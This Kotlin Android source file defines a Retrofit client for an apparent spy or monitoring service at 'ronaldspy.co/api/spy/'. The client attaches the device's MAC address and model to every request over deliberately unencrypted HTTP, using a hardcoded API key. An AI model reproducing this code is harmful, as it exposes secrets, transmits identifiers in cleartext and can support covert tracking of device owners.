package com.umarabbas.firstproject

import android.content.Context
import android.net.wifi.WifiManager
import android.os.Build
import com.google.gson.GsonBuilder
import okhttp3.*
import okhttp3.logging.HttpLoggingInterceptor
import retrofit2.Retrofit
import retrofit2.converter.gson.GsonConverterFactory
import retrofit2.converter.scalars.ScalarsConverterFactory
import java.net.NetworkInterface
import java.util.*
import java.util.concurrent.TimeUnit


object RetrofitClientInstance {
    const val BASE_URL = "http://ronaldspy.co/api/spy/"
    private var retrofit: Retrofit? = null
    private var Mcontext: Context? = null


    fun getClient(context: Context?): Retrofit? {
        Mcontext = context
        val gson = GsonBuilder()
                .setLenient()
                .create()
        val okHttpClient = getHTTPClient()
        if (retrofit == null) {
            retrofit = Retrofit.Builder()
                    .baseUrl(BASE_URL)
                    .client(okHttpClient)
                    .addConverterFactory(ScalarsConverterFactory.create())
                    .addConverterFactory(GsonConverterFactory.create(gson))
                    .build()
        }
        return retrofit
    }

    fun getMac(): String {
        try {
            var listOfNetworks = NetworkInterface.getNetworkInterfaces().toList()
            for (addres in listOfNetworks) {
                if (addres.name.equals("wlan0", ignoreCase = true)) continue
                var bytesOfMac = addres.hardwareAddress
                var builder = StringBuilder()
                for (bytes in bytesOfMac)
                    builder.append(String.format("%02X:", bytes))
                if (builder.length > 0)
                    builder.deleteCharAt(builder.length - 1)
                return builder.toString()
            }
        } catch (e: Exception) {
            return "02:00:00:00:00:00"
        }
        return "02:00:00:00:00:00"
    }

    private fun getHTTPClient(): OkHttpClient {
        return OkHttpClient().newBuilder()
                .retryOnConnectionFailure(true)
                .connectTimeout(15, TimeUnit.SECONDS)
                .connectionSpecs(Collections.singletonList(ConnectionSpec.Builder(ConnectionSpec.CLEARTEXT/*MODERN_TLS*/).build()))
                .readTimeout(2, TimeUnit.MINUTES)
                .writeTimeout(2, TimeUnit.MINUTES)
                .addInterceptor(Interceptor { chain: Interceptor.Chain ->
                    val original = chain.request()
                    val requestBuilder = original.newBuilder().apply {
                        addHeader("key", "odBSpkO1EwBQvT4NQ8hUZue7mLU9zMcHswk8IqBE")
                        addHeader("macAddress", getMac())
                        addHeader("timeStamp", "${Calendar.getInstance().time}")
                        addHeader("mobileName", "${Build.MANUFACTURER} ${Build.MODEL}")
                    }
                    val request = requestBuilder.build()
                    chain.proceed(request)
                }).build()

    }

}